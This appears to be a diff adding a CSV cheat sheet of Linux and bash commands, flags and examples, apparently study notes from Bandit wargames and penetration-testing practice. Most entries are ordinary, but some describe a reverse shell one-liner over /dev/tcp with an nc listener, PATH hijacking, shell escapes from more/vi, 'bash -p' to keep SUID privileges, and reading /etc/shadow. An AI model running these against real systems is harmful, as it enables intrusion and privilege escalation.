@@ -1,0 +1,338 @@
+Command,Parameter,Description,Example
+sudo,su,Switches to the root session permanently until you exit,sudo su
+grep,-n,Shows the line number of each match,"grep -n ""root"" /etc/passwd"
+grep,-i,Ignores uppercase and lowercase when looking for matches,"grep -i ""error"" log.txt"
+cat,/etc/group,File listing the existing groups and their members,cat /etc/group
+echo,$PATH,Variable holding the folders where the system looks for commands,echo $PATH
+command,-v,"Shows the path of a command, similar to which",command -v python3
+ls,-l,"Detailed listing (permissions, owner, size, date)",ls -l /etc
+cd,.,Stays in the current folder,cd .
+cd,..,Goes up one level to the parent folder,cd ..
+cd,(absolute path),Goes to a specific location starting from the system root,cd /var/log
+cd,(relative path),Goes to a location relative to the current directory,cd ../documents
+cd,/,Goes straight to the system root,cd /
+cd,~,Goes to the user's home folder,cd ~
+echo,$HOME,Variable holding the path of the user's home folder,echo $HOME
+echo,$SHELL,"Variable holding the path of the shell in use (bash, zsh)",echo $SHELL
+cat,/etc/passwd,"File with basic user info (UID, home, shell)",cat /etc/passwd
+cat,/etc/shells,File listing the shells installed and available,cat /etc/shells
+cat,/etc/hosts,File with manual IP-to-domain mappings that skip DNS,cat /etc/hosts
+echo,$?,"Exit code of the last command (0 = success, anything else = error)",ls /doesnotexist ; echo $?
+>,/dev/null,Special file that works as a trash bin: anything sent to it is discarded,"echo ""hello"" > /dev/null"
+>,done > file,Saves the output of a whole loop into a file,for i in $(seq 1 100); do echo $(($RANDOM % 37)); done > output
+>,> file,"On its own, empties a file without deleting it",> log.txt
+2>&1,3>&1 1>&2 2>&3,"Swaps stdout and stderr, using descriptor 3 as a temporary copy",ls /etc /nothing 3>&1 1>&2 2>&3
+exec,3<> file,"Opens ""file"" for reading and writing as descriptor 3",exec 3<> file.txt
+exec,>&3,Redirects the session's standard output to descriptor 3,exec >&3
+exec,3>&-,Closes descriptor 3,exec 3>&-
+exec,5>&3,Duplicates descriptor 3 into descriptor 5,exec 5>&3
+exec,8>&3-,Duplicates descriptor 3 into 8 and closes the original 3,exec 8>&3-
+cat,/etc/shadow,File where users' encrypted passwords are stored,sudo cat /etc/shadow
+cat,/etc/login.defs,System configuration; ENCRYPT_METHOD sets how passwords are hashed,grep ENCRYPT_METHOD /etc/login.defs
+chmod,o+w,"Adds write permission for ""others"" (other users)",chmod o+w file.txt
+chmod,o-w,"Removes write permission for ""others"" (other users)",chmod o-w file.txt
+rm,-r,Deletes folders and everything inside them recursively,rm -r old_folder
+useradd,-s,Sets the new user's shell,sudo useradd -s /bin/bash john
+useradd,-d,Sets the new user's home folder,sudo useradd -d /home/john john
+usermod,-a,"Together with -G, adds the user to a group without removing them from their current ones",sudo usermod -a -G sudo john
+usermod,-G,Sets the user's secondary groups,"sudo usermod -G developers,docker john"
+chmod,755,"Octal notation: r=4, w=2, x=1, added up per block (owner, group, others); 755 means rwxr-xr-x and 777 means full permissions for everyone",chmod 755 script.sh
+chmod,+t,Enables the Sticky Bit on a folder: only a file's owner or root can delete or rename it,chmod +t /tmp/shared
+rm,-f,"Forces deletion without asking, even if the file is write-protected",rm -f protected_file.txt
+rm,-r /tmp/$var,Careful: if the variable is empty it becomes rm -r /tmp; quote and check it,"rm -r ""/tmp/$dir"""
+chattr,+i,"Makes the file immutable: nobody, not even root, can modify, delete or rename it until the attribute is removed",sudo chattr +i file.txt
+chattr,-V,Verbose mode when changing the attribute,sudo chattr -V +i file.txt
+chmod,4000,Octal value of the SUID special permission,chmod 4755 program
+chmod,u+s,Symbolic way to set SUID (s bit on the owner's execute permission),chmod u+s program
+chmod,2000,Octal value of the SGID special permission,chmod 2755 folder
+chmod,g+s,Symbolic way to set SGID (s bit on the group's execute permission),chmod g+s folder
+chmod,S / T,Uppercase S (SUID/SGID) or T (sticky) means the special bit is set but that block has no execute permission,"rwSr--r-x = 4645, rwsr--r-x = 4745"
+chmod,+x,Gives execute permission,chmod +x example.sh
+chmod,u-x,"Removes execute from the owner (u owner, g group, o others)",chmod u-x script.sh
+chmod,-x,Removes execute permission from everyone,chmod -x script.sh
+chmod,o-rx,Removes read and execute from others,chmod o-rx script.sh
+chmod,700,"Octal rwx------: only the owner can read, write and run it",chmod 700 script.sh
+getcap,-r,Searches for and shows capabilities recursively through subfolders,getcap -r / 2>/dev/null
+setcap,-r,Removes the capabilities assigned to a file,sudo setcap -r /usr/bin/ping
+ls,-a,Shows all files including hidden ones (those starting with a dot),ls -a ~
+hostname,-I,Shows the IP address(es) assigned to the machine,hostname -I
+cut,-d,Sets the delimiter used to split the text into columns,"cut -d "":"" -f 1 /etc/passwd"
+cut,-f,Selects the field (column) number to extract,"cut -d "":"" -f 3 /etc/passwd"
+awk,'{print $1}',Prints the first column of each line,ls -l | awk '{print $1}'
+alias,name='absolute_path',Creates a shortcut that runs a long command or path with a short word,alias ll='ls -la'
+export,variable_name,Turns a variable into an environment variable available to other processes,"export MY_VAR=""hello"""
+apt,update,Refreshes the list of available packages from the repositories without installing anything,sudo apt update
+apt,upgrade,Installs updates for the packages you have installed (don't use it on Parrot),sudo apt upgrade
+sudo,pacman -Syu,Arch Linux: syncs the package list and upgrades the whole system,sudo pacman -Syu
+sudo,pacman -S,Arch Linux: installs a package,sudo pacman -S dash
+find,-name,Searches for files by exact name or with wildcards,find -name '*xampl*.sh'
+find,-type,Filters by type: file (f) or directory (d),find /home -type f
+find,-perm,Filters by the file's specific permissions,find / -perm -4000 2>/dev/null
+find,-group,Filters by owning group,find /home -group developers
+find,-user,Filters by owning user,find /home -user john
+find,-writable,Shows only files you have write permission on,find /etc -writable 2>/dev/null
+find,-executable,Shows only files you have execute permission on,find /usr/bin -executable -type f
+find,-readable,Shows only files you have read permission on,find /var -readable 2>/dev/null
+tail,-n,Sets how many lines from the end to show,tail -n 20 /var/log/syslog
+awk,'NR==2',Shows only line number 2 (NR = record number),awk 'NR==2' file.txt
+awk,"FS=""/""","Sets ""/"" as the field separator (FS) to split the text into columns","echo ""/home/john"" | awk '{print $2}' FS=""/"""
+echo,-e,"Enables special characters (\n, \t) in the printed text","echo -e ""line1\nline2"""
+echo,"-e ""\n""",\n is a line break; it needs the -e flag,"echo -e ""Hello\nWorld"""
+echo,"-e ""\t""",\t is a tab; it needs the -e flag,"echo -e ""Name\tAge"""
+echo,-n,"Doesn't add the final line break, so whatever comes next stays on the same line","echo -n ""Bet: ""; read initial_bet"
+ssh,-p,Sets the port to connect to when the SSH server doesn't use the default one (22),ssh -p 2222 user@192.168.1.10
+export,TERM=xterm,Sets the terminal type; useful when a remote connection has compatibility issues,export TERM=xterm
+export,PATH=dir:$PATH,Puts a directory first in the PATH; base of PATH hijacking,export PATH=/tmp/evil:$PATH
+sshpass,-p,Gives the password directly in the command so you don't have to type it when connecting over SSH,sshpass -p 'my_password' ssh user@192.168.1.10
+ssh,bandit0@bandit.labs.overthewire.org -p 2220,Connects to the Bandit server as bandit0 on port 2220 instead of 22,ssh bandit0@bandit.labs.overthewire.org -p 2220
+cat,/home/bandit1/-,"Reads the file named ""-"" by its absolute path, so cat doesn't confuse it with standard input",cat /home/bandit1/-
+cat,./-,"Reads the ""-"" file by pointing to the current directory, avoiding the stdin confusion",cat ./-
+cat,$(pwd)/-,Combines pwd (the current path) with the file name; same effect as the absolute path,cat $(pwd)/-
+grep,"-r ""\w""",Recursively finds lines with at least one alphanumeric character to locate content in files in any folder,"grep -r ""\w"" /home/user/"
+cut,-d ':' -f 2,"Splits each line using "":"" as the delimiter and extracts only the second field","echo ""a:b:c"" | cut -d ':' -f 2"
+cut,"-f1,7",Extracts several fields at once (here 1 and 7),"cut -d: -f1,7 /etc/passwd"
+tr,':' ' ',"Replaces every "":"" with a space in the processed text","echo ""a:b:c"" | tr ':' ' '"
+awk,"'{print $2}' FS="":""","Uses "":"" as the field separator (FS) and prints the second column of each line","echo ""a:b:c"" | awk '{print $2}' FS="":"""
+awk,'NF{print $NF}',Prints the last field of each line; NF is the number of fields and $NF the value of the last one,"echo ""one two three"" | awk 'NF{print $NF}'"
+awk,"""/name: \""Forge\""/,/resuelta:/""",Prints the block of lines from the one matching the first pattern up to the one matching the second,"awk ""/name: \""Forge\""/,/resuelta:/"" bundle.js"
+awk,-F,Sets the field separator,awk -F: '{print $2}' /etc/passwd
+awk,NR>1 {print $N},Skips the first line (the header) and prints a field,ss -tn | awk 'NR>1 {print $5}'
+tail,-n 1,Shows only the last line of the file or text,tail -n 1 file.txt
+tail,-1,Short form of tail -n 1 (the last line),dig +short domain | tail -1
+head,-n 1,Shows only the first line of the file or text,head -n 1 file.txt
+head,-n -3,"With a negative number, shows everything except the last 3 lines",cat /etc/hosts | head -n -3
+head,-c,Keeps the first N characters (bytes),cat /dev/urandom | tr -dc 'a-z' | head -c 16
+cat,"""spaces in this filename""",Reads a file with spaces by wrapping its name in quotes so it's treated as a single name,"cat ""spaces in this filename"""
+cat,spaces\ in\ this\ filename,Reads a file with spaces by escaping each space with a backslash so they don't split the arguments,cat spaces\ in\ this\ filename
+cat,s*,"Uses a wildcard to fill in the file name, as long as no other file starts the same way",cat s*
+cat,home/bandit/s*,"Same wildcard trick, but including the path to the file",cat home/bandit/s*
+find,.,"Lists every file and folder in the current directory, including subdirectories",find .
+grep,"-vE ""bashrc\|profile""","Shows the lines that do NOT match ""bashrc"" or ""profile""; -v inverts the match and -E enables extended regex (\| means ""or"")","ls -a | grep -vE ""bashrc|profile"""
+grep,-A 5,Shows the match and the 5 lines that come after it (After),"grep -A 5 ""root"" /etc/passwd"
+grep,-B 5,Shows the match and the 5 lines that come before it (Before),"grep -B 5 ""root"" /etc/passwd"
+grep,-C 5,Shows the match with 5 lines of context before and after it (Context),"grep -C 5 ""root"" /etc/passwd"
+grep,-oP,"-o shows only the matching part and -P enables Perl regex (\K drops what came before, (?=...) checks what comes after); this one extracts what's between brackets",grep -oP '\[\K.*?(?=\])' output.txt
+grep,-v,Excludes the lines that match,"cat /etc/passwd | grep -v ""nologin"""
+grep,-E,Extended regex: lets you search several words separated by |,"cat /etc/passwd | grep -vE ""nologin|false"""
+grep,-vE,Excludes lines matching several patterns separated by | ([ is escaped with \),"grep -vE ""local|\["""
+grep,^pattern$,^ anchors the start of the line and $ the end; together they match exactly,"grep ""^test$"" rockyou.txt"
+grep,-oE,"Shows only the match, with extended regex (good for extracting emails)","grep -oE '[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}' file.txt"
+grep,-q,"Quiet: shows nothing, only sets the exit code","grep -q ""root"" /etc/passwd && echo found"
+grep,-qE,Quiet + extended regex; good to validate formats like an IP,"echo ""$ip"" | grep -qE '^[0-9]{1,3}(\.[0-9]{1,3}){3}$'"
+find,-size,Filters the search by file size,find -size 1033c
+find,-perm -o+w,Finds files that others can write to,"find / -type f -name ""*.sh"" -user root -perm -o+w 2>/dev/null"
+find,-perm -2000,Finds files with the SGID permission,find / -perm -2000 2>/dev/null
+uniq,-u,"Shows only completely unique lines, the ones that never repeat",sort data.txt | uniq -u
+uniq,-c,Counts how many times each line repeats,sort ips.txt | uniq -c
+base64,-d,Decodes Base64 text back to its original form,"echo ""aG9sYQ=="" | base64 -d"
+tr,'[A-Za-z]' '[N-ZA-Mn-za-m]',"Replaces each letter with the one 13 positions ahead, applying the ROT13 cipher","echo ""Uryyb"" | tr '[A-Za-z]' '[N-ZA-Mn-za-m]'"
+tr,-d ' ',Deletes every space from the processed text,"echo ""h o l a"" | tr -d ' '"
+tr,"' ' ','",Replaces spaces with commas,"echo ""a b c"" | tr ' ' ','"
+tr,' ' '\n',Turns spaces into newlines,"echo ""a b c"" | tr ' ' '\n'"
+tr,-dc,Deletes everything that's NOT in the given set (delete complement),cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 16
+sort,-u,Sorts and removes repeated lines,sort -u output.txt
+sort,-n,Sorts numerically instead of alphabetically,sort -n numbers.txt
+sort,-rn,"Sorts numerically, highest to lowest",sort -rn counts.txt
+wc,-c,Counts the characters (including the line break),"echo ""$line"" | wc -c"
+wc,-l,Counts the lines,find / -perm -4000 2>&1 | wc -l
+xxd,-p,"Shows plain hexadecimal output, without addresses or text alongside",xxd -p file.bin
+xxd,-s,Skips to a specific offset in the file before showing it in hexadecimal,xxd -s 16 file.bin
+xxd,-r,Turns a hex dump back into binary,xxd -r data.hex output.bin
+xxd,-l,Limits the output to N bytes,xxd -p -l 32 /dev/urandom
+7z,l,Lists an archive's contents without extracting it,7z l backup.7z
+7z,x,Extracts an archive's contents keeping its folder structure,7z x backup.7z
+ssh-copy-id,-i,Sets which public key file to copy when you have several keys,ssh-copy-id -i ~/.ssh/id_ed25519.pub user@192.168.1.10
+ssh,-i,Sets which private key file to use to authenticate over SSH,ssh -i ~/.ssh/id_ed25519 user@192.168.1.10
+cat,~/.ssh/authorized_keys,File with the SSH public keys allowed to log into that account without a password,cat ~/.ssh/authorized_keys
+ss,-nltp,"Shows listening TCP sockets without resolving names, including the process behind each one",sudo ss -nltp
+ss,-tln,Shows the listening TCP ports (no name resolution),ss -tln
+ss,-tn,Shows the established TCP connections,ss -tn
+lsof,-i:,Filters the output to show only connections related to the given port,sudo lsof -i:80
+uname,-a,"Shows all the system information (kernel, hostname, architecture)",uname -a
+uname,-r,Shows only the kernel version,uname -r
+uname,-m,Shows the system architecture,uname -m
+kill,-9,Forces the process to end immediately (SIGKILL),kill -9 1234
+kill,-15,SIGTERM: ends the process in an orderly way (exit code 143),kill -15 $!
+ln,-s,Creates a symbolic link (a shortcut that points to the original path),ln -s /etc/hosts hosts_link
+ln,-sf,Creates a symbolic link and replaces it if it already exists,sudo ln -sf /usr/bin/dash /usr/bin/sh
+ps,-faux,Shows every process from every user in a detailed tree format,ps -faux
+ps,-eo command,Shows only the command column for each process,ps -eo command
+ps,aux,"Shows every process of every user, with its owner",ps aux | grep root | head
+echo,"""obase=10; ibase=16; $hexNum"" | bc",Converts a variable's hexadecimal value to decimal using bc,"hexNum=""FF""; echo ""obase=10; ibase=16; $hexNum"" | bc"
+echo,'$HOME',"Single quotes print the text literally, without expanding variables (double quotes do expand them)",echo '$HOME' → $HOME
+echo,$ZSH_VERSION,Variable holding the zsh version (empty if you're not in zsh),echo $ZSH_VERSION
+echo,$BASH_VERSION,Variable holding the bash version,echo $BASH_VERSION
+echo,"\$ \"" \\","Backslash escapes a character so it's taken literally (\$, \"", \\)","echo ""string \$test""; echo ""C:\\Users\\user"""
+echo,$'...',$'...' interprets \t and \n without needing -e,echo $'hello\tbye'
+echo,$a+$b,Concatenates the text of both variables; it does NOT add (use $((a+b)) for that),echo $a+$b
+echo,$USER,Variable with the current user,echo $USER
+echo,$PWD,Variable with the current directory,echo $PWD
+echo,$OLDPWD,Variable with the previous directory,echo $OLDPWD
+echo,$TERM,Variable with the terminal type,echo $TERM
+echo,$HOSTNAME,Variable with the machine name (may be empty in zsh),echo $HOSTNAME
+cat,/proc/net/tcp,"Virtual file with the active TCP connections (IPs, ports and state) in hexadecimal",cat /proc/net/tcp
+cat,<< 'EOF',Heredoc: writes everything up to EOF into a file from the terminal,cat > /tmp/file.sh << 'EOF'\n...\nEOF
+ncat,--ssl,Encrypts the connection with SSL/TLS to protect the data being sent,ncat --ssl 192.168.1.10 443
+ssh,"user@host ""command""","Runs a command directly on the remote server when connecting, without loading a full interactive session or the user's bashrc","ssh user@192.168.1.10 ""ls -la"""
+bash,-p,Starts the shell in privileged mode so the effective UID/GID aren't reset; useful to keep privileges gained through SUID,bash -p
+bash,script.sh,"Runs the script with bash, even without execute permission",bash script.sh
+bash,-c,Runs the command string passed to it (handy to test in a subshell),bash -c 'echo $test'
+ls,/etc/cron.d,Directory holding the configuration files of the system's Cron jobs,ls -l /etc/cron.d
+ls,/etc,Folder where the system's configuration files live,ls /etc
+ls,/bin /sbin /usr/sbin,Folders where programs are usually stored (it depends on the distro),ls /usr/sbin
+ls,/dev,Folder with the system's devices; many of them aren't physical but virtual,ls /dev
+ls,-l /usr/bin/sh,"On a link, shows where it points (sh → dash or bash)",ls -l /usr/bin/sh
+crontab,* * * * * command,"Cron job format: Minute Hour Day-of-month Month Day-of-week Command; * means every value (every minute, hour, etc.)",* * * * * /home/user/script.sh
+crontab,*/3 * * * *,*/N means every N units; this one runs every 3 minutes,*/3 * * * * /home/user/script.sh
+crontab,* * * * 6,The 5th field is the day of the week: 0 or 7 Sunday ... 6 Saturday; this one runs every minute on Saturdays,* * * * 6 /home/user/script.sh
+watch,-n 1,Sets the interval in seconds between runs; here every 1 second,watch -n 1 ls -l /tmp
+more,v,"From inside more, opens visual mode (the vi editor) on the content",v (inside more)
+more,:set shell=/bin/bash,"Once in visual mode (after Esc + Shift + :), sets Bash as the shell to use",:set shell=/bin/bash
+more,:shell,"Opens an interactive shell from visual mode, escaping more's context",:shell
+git show,(commit id),Shows every change applied in that commit,git show a1b2c3d
+git checkout,(commit id),"Takes the project back to that point in history, restoring the files that existed then",git checkout a1b2c3d
+git branch,-a,"Lists every branch in the project, both local and remote",git branch -a
+git checkout,(branch name),Switches to the given branch by name,git checkout develop
+git show,(tag name),"Shows info about the given tag and the commit it points to, with its changes",git show v1.0
+git add,-f,Forces a file into the staging area even if .gitignore ignores it,git add -f key.txt
+git commit,"-m ""identifier""",Sets the message that identifies the commit,"git commit -m ""Add key.txt"""
+git push,-u origin branch,Pushes commits to the given branch on the origin remote and links it so later push/pull don't need it spelled out,git push -u origin master
+sed,'s/^ *//',Removes the spaces at the start of each line,"echo ""   hello"" | sed 's/^ *//'"
+sleep,0.4,Accepts decimals to pause for less than a second,sleep 0.4
+exit,0,"Ends the script with exit code 0, signalling success",exit 0
+exit,1,"Ends the script with exit code 1, signalling an error",exit 1
+exit,2,Ends the script with code 2 (wrong usage / not found),exit 2
+declare,-i,"Makes the variable an integer, so its value is treated as a number",declare -i counter=0
+declare,-a,Declares the variable as an array,declare -a my_array=(1 2 3 4)
+declare,-r,Makes the variable read-only; changing it gives a readonly variable error,"declare -r name=""test"""
+array=(1 2 3),$array,"Without an index, shows only the first element",echo $my_array
+array=(1 2 3),${array[@]},Shows all the elements,echo ${my_array[@]}
+array=(1 2 3),${#array[@]},Gives the total number of elements,echo ${#my_array[@]}
+array=(1 2 3),${array[0]},Gives the first element (the braces are required),echo ${my_array[0]}
+array=(1 2 3),${array[-1]},Gives the last element,echo ${my_array[-1]}
+array=(1 2 3),+=(5),Adds an element to the end,my_array+=(5)
+array=(1 2 3),=(${array[@]}),"Re-indexes the array after an unset, so positions don't stay shifted",my_array=(${my_array[@]})
+unset,array[0],Deletes the first element of the array,unset my_array[0]
+unset,array[-1],Deletes the last element of the array,unset my_array[-1]
+unset,variable,Removes a variable,unset my_var
+let,+=,Adds a value to what the variable already holds,let counter+=1
+let,-=,Subtracts a value from what the variable already holds; without let it gives an error,let money-=$bet
+"variable=""Hello""",=$other_variable,Copies another variable's value into this one,backup_bet=$initial_bet
+"variable=""Hello""","+=""text""","With text, appends a string to the end of the current value","bad_plays+=""$random_number """
+"variable=""Hello""","=""""","Starts the variable empty, ready to fill it later","bad_plays="""""
+"variable=""Hello""",${name:-default},"Uses 'default' if the variable is empty, without assigning it",echo ${name:-Marcelo}
+"variable=""Hello""",${name:=default},Uses 'default' and also assigns it to the variable,echo ${name:=Marcelo}
+$variable or ${variable},"""$variable text""",Sticks fixed text right after a variable's value,"echo ""$bad_plays]"""
+$(( )),+ - *,"Add, subtract and multiply inside the arithmetic expansion",echo $((5 + 3)) $((5 - 3)) $((5 * 3))
+$(( )),%,"Modulo: the remainder of a division, for example to limit a random number to a range",echo $(($RANDOM % 37))
+$(( )),**,Raises to a power,echo $((2 ** 8))
+$(( )),/,"Divides, keeping only the integer part",echo $((10 / 3))
+getopts,"""m:h"" arg","List of valid options, stored in arg; a "":"" after a letter means that option takes a value, which ends up in $OPTARG","while getopts ""m:h"" arg; do case $arg in m) name=$OPTARG;; h) help;; esac; done"
+getopts,$OPTARG,Holds the value that comes with the option getopts is currently processing,"while getopts ""m:h"" arg; do case $arg in m) name=$OPTARG;; esac; done"
+if,-eq,Checks whether two numbers are equal,"if [ $a -eq $b ]; then echo ""equal""; fi"
+if,[ condition ],"Needs a space after [ and before ]; without it the condition fails, often with no error","if [ $a -eq 1 ]; then echo ""ok""; fi"
+if,-ne,Checks whether two numbers are different (not equal),"if [ $a -ne $b ]; then echo ""different""; fi"
+if,-gt,Checks whether the first number is greater than the second,"if [ $a -gt $b ]; then echo ""greater""; fi"
+if,-lt,Checks whether the first number is less than the second,"if [ $a -lt $b ]; then echo ""less""; fi"
+if,-le,Checks whether the first number is less than or equal to the second,"if [ $a -le $b ]; then echo ""less or equal""; fi"
+if,-ge,Checks whether the first number is greater than or equal to the second,"if [ $a -ge $b ]; then echo ""greater or equal""; fi"
+if,==,Compares two text strings to check they're equal,"if [ ""$choice"" == ""even"" ]; then echo ""even""; fi"
+if,!,Negates the condition: [ ! $a -le 0 ] is the same as [ $a -gt 0 ],"if [ ! ""$money"" -le 0 ]; then echo ""still have money""; fi"
+if,-f,Checks whether the file exists and is a regular file (not a folder),"if [ -f file.txt ]; then echo ""exists""; fi"
+if,elif,"Inside an if, checks another condition when the previous one wasn't met (else if)","if [ $n -eq 1 ]; then echo ""one""; elif [ $n -eq 2 ]; then echo ""two""; else echo ""other""; fi"
+if,else,Runs a block when none of the if or elif conditions were met; goes right before fi,"if [ -f file.txt ]; then echo ""exists""; else echo ""missing""; fi"
+if,[ ] && [ ],Joins two conditions; both must be true for the block to run,"if [ ${#my_sequence[@]} -ne 1 ] && [ ${#my_sequence[@]} -ne 0 ]; then echo ""2 or more""; fi"
+if,[ ] || [ ],Joins two conditions; it's enough for one of them to be true,"if [ $(($n % 2)) -eq 1 ] || [ $n -eq 0 ]; then echo ""odd or zero""; fi"
+if,=,Compares two strings (equal),"[ ""$name"" = ""sabitar"" ]"
+if,!=,Compares two strings (not equal),"[ ""$name"" != ""test"" ]"
+if,-z,True if the variable is empty,"[ -z ""$var"" ]"
+if,-n,True if the variable has content (always quote it),"[ -n ""$var"" ]"
+if,-e,True if it exists (any type),[ -e /etc/passwd ]
+if,-d,True if it's a directory,"[ -d ""$HOME/.ssh"" ]"
+if,-r,True if you can read it,[ -r /etc/shadow ]
+if,-w,True if you can write it,[ -w /etc/crontab ]
+if,-x,True if you can run it,"[ -x ""$(pwd)/script.sh"" ]"
+if,-s,True if it exists and is not empty,[ -s file.txt ]
+if,-L,True if it's a symbolic link,[ -L /usr/bin/sh ]
+if,-p,True if it's a named pipe,[ -p mypipe ]
+if,-S,True if it's a socket,[ -S /var/run/docker.sock ]
+if,-t,True if there's an interactive terminal (-t 0 checks stdin),[ -t 0 ]
+if,-nt,True if the first file is newer than the second (newer than),[ /etc/passwd -nt /tmp/passwd ]
+if,-ot,True if the first file is older than the second (older than),[ /etc/passwd -ot /etc/hosts ]
+if,-a,AND inside a single [ ] (fragile; prefer [ ] && [ ]),"[ ""$u"" = root -a -f /etc/passwd ]"
+if,-o,OR inside a single [ ] (prefer [ ] || [ ]),[ -f a -o -f b ]
+case,m) command;;,Defines a pattern inside case and the block to run if it matches; ;; closes that block,"case $arg in m) echo ""option m"";; esac"
+while,[ ]; do; done,Repeats the block while the condition inside the brackets is true,while [ -f file.gz ]; do gunzip file.gz; done
+while,read line; do; done,Reads input line by line and runs the block for each line,cat list.txt | while read line; do echo $line; done
+while,true,"Infinite loop; it only stops with break, exit or Ctrl+C","while true; do echo ""playing""; sleep 1; done"
+for,line in; do; done,Goes through the items of a list one by one and runs the block for each,for line in $(cat list.txt); do echo $line; done
+for,element in ${array[@]}; do; done,Goes through each element of an array,for element in ${my_array[@]}; do echo $element; done
+function name(){ commands },ctrl_c(){},Defines the ctrl_c function that runs when trap catches Ctrl+C,"function ctrl_c(){ echo ""Exiting...""; exit 1; }"
+function name(){ commands },local,Creates a variable that only exists inside the function,"local file=""$1"""
+trap,ctrl_c INT,Catches the Ctrl+C signal and runs the ctrl_c function instead of stopping the script,trap ctrl_c INT
+timeout,"1 bash -c """"","Runs a command with a 1-second limit; if it doesn't finish, it's cancelled","timeout 1 bash -c ""echo > /dev/tcp/127.0.0.1/22"" && echo ""open"""
+mktemp,-d,"Creates a temporary folder instead of a file, with a unique name",mktemp -d
+tput,civis,Hides the terminal cursor,tput civis
+tput,cnorm,Shows the terminal cursor again,tput cnorm
+{0000..9999},"{a,b,c}","With commas, expands to each value of the list","touch file.{summary,report,results}"
+curl,-s,Silent mode: hides the progress bar and error messages,curl -s https://example.com
+curl,-X GET,"Sets the request's HTTP method (GET, POST, PUT...)",curl -s -X GET https://example.com
+curl,-o,Where to save the output (/dev/null to discard the body),"curl -s -o /dev/null -w ""%{http_code}"" https://site"
+curl,-w,"Chooses what to print, e.g. %{http_code} for the HTTP code","curl -s -o /dev/null -w ""%{http_code}"" https://site"
+curl,--connect-timeout,Sets a maximum time to connect,curl --connect-timeout 2 http://ip
+vi,V,"In Vim, selects whole lines (visual line mode)",V (then move with j/k)
+vi,> / <,"In Vim, indents (>) or unindents (<) the selected lines","V, select the lines, then >"
+vi,y,"In Vim, copies (yanks) the selected lines","V, select the lines, then y"
+vi,p / P,"In Vim, pastes below (p) or above (P) the current line","y to copy, move, then p"
+vi,d,"In Vim, deletes (cuts) the selection; paste it back with p","V, select the lines, then d"
+vi,yy,"In Vim, copies the current line (paste it with p)","yy, then p"
+vi,.file.swp,Swap file Vim leaves when it closes badly; delete it with rm so you can open the file again,rm .roulette.sh.swp
+vi,:%s/old/new/g,"In Vim/Neovim, replaces in the whole file (% = whole file, g = all per line)",:%s/local_port/port/g
+ping,-c,Number of packets to send,ping -c 1 192.168.100.1
+ping,-W,Maximum seconds to wait for a reply,ping -c 1 -W 1 192.168.100.1
+/dev/tcp/$ip/$port,/dev/udp/$ip/$port,"Same pseudo-device for UDP; both only work in Bash, not in zsh",echo '' > /dev/udp/192.168.100.1/53
+/dev/tcp/$ip/$port,bash -i >& ... 0>&1,Reverse shell one-liner: sends an interactive bash to a listener,bash -i >& /dev/tcp/10.0.0.1/443 0>&1
+(command),(command) 2>/dev/null,Redirecting the subshell hides the errors of the command inside it,(echo '' > /dev/tcp/192.168.100.1/22) 2>/dev/null
+#!/bin/bash,#!/usr/bin/bash,"Same as #!/bin/bash, using the other usual path of bash",#!/usr/bin/bash
+#!/bin/bash,#!/bin/sh,Runs the script with sh (dash or bash depending on the system); no arrays,#!/bin/sh
+#!/bin/bash,#!/usr/bin/python3,Shebang for a Python 3 script,#!/usr/bin/python3
+#!/bin/bash,#!/usr/bin/perl,Shebang for a Perl script,#!/usr/bin/perl
+#!/bin/bash,#!/usr/bin/env bash,Portable shebang: looks for bash in the PATH instead of a fixed path,#!/usr/bin/env bash
+which,/usr/bin/bash /bin/bash /usr/bin/zsh /bin/zsh,Typical paths where the shells live,which bash
+readlink,-f,Follows every link to the real path; with /proc/$$/exe shows the real shell running,readlink -f /proc/$$/exe
+uptime,-p,Shows the uptime in a readable format,uptime -p
+ip,a,Lists the interfaces with their IP addresses,ip a | grep inet | head -n 1 | awk '{print $2}'
+ip,-4 addr show,Shows the IPv4 of an interface; pair it with grep -oP to pull just the IP,ip -4 addr show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'
+bc,scale=2,Sets how many decimals bc uses,"echo ""scale=2; 10/3"" | bc"
+set,-u,Aborts the script if you use an undefined variable,set -u
+dig,+short,Shows only the resolved IP,dig +short scanme.nmap.org
+nc,-nlvp,"Leaves a listener on a port (n no DNS, l listen, v verbose, p port)",nc -nlvp 443
+"$1, $2...",${1:-default},"Takes the first argument, or a default value if there isn't one",target=${1:-scanme.nmap.org}
+"$1, $2...",${10},"From argument 10 on, you need braces",echo ${10}
+$(),`command`,"Backticks do the same as $(...), capturing a command's output (he prefers $(...))",ip=`whoami`
+xargs,(join lines),"With no command, joins all the lines into a single one",cat ips.txt | xargs
+source,~/.bashrc,Config files like ~/.bashrc and ~/.bash_profile are loaded with source,source ~/.bashrc
+read,-ra ... <<<,Reads text into an array; <<< (here-string) feeds the text to read,"IFS=',' read -ra ports <<< ""$list"""
+read,-r,Reads backslashes as literal text (raw),read -r line
+read,-a,Stores the input as an array,read -a items
+read,-p,Shows a prompt before reading from the keyboard,"read -p ""Type something: "" answer"
+read,-rp,Combines -r (raw) and -p (prompt),"read -rp ""Enter IP: "" ip"
+tee,-a,Shows the output and appends it to the file without overwriting,command | tee -a output.txt
+mkdir,-p,"Doesn't fail if the folder exists, and can create nested paths",mkdir -p a/b/c
+dd,if= of=,Input file (if) and output file (of),dd if=/dev/zero of=file.txt
+dd,bs= count=,Block size (bs) and number of blocks (count),dd if=/dev/zero of=file.txt bs=1M count=1
+date,+%Y-%m-%d %H:%M:%S,"Format: %Y year, %m month, %d day, %H hour, %M minute, %S second",date '+%Y-%m-%d %H:%M:%S'
+pgrep,-x,Matches the exact process name,pgrep -x nginx
+wait,$!,Waits for a background process and collects its exit code,sleep 5 & wait $!
+(( )),((var++)),Increments a counter (same as var=$((var+1))),((up_hosts++))
+(( )),(( a > b )),"Arithmetic comparison without $ or quotes (>, <, >=, <=, ==, && )",(( port > 0 && port <= 65535 ))
+(( )),((var+=5)),"Compound arithmetic assignment (+=, -=, **, ...)",((counter += 5))
+id,-u,Shows your UID (0 = root),"[ ""$(id -u)"" -eq 0 ]"
+ssh-keygen,-f,Sets the path/name of the key files,ssh-keygen -f ~/.ssh/my_key
+[[ ]],==,"Glob pattern match, pattern without quotes: *.py, arch*, *chi*",[[ $name == *.py ]]
+[[ ]],=~,Matches against an extended regex (regex without quotes); fills BASH_REMATCH,"[[ $ip =~ ^[0-9]{1,3}(\.[0-9]{1,3}){3}$ ]]"
+[[ ]],< >,Compares strings in alphabetical (lexicographic) order,[[ abc < def ]]
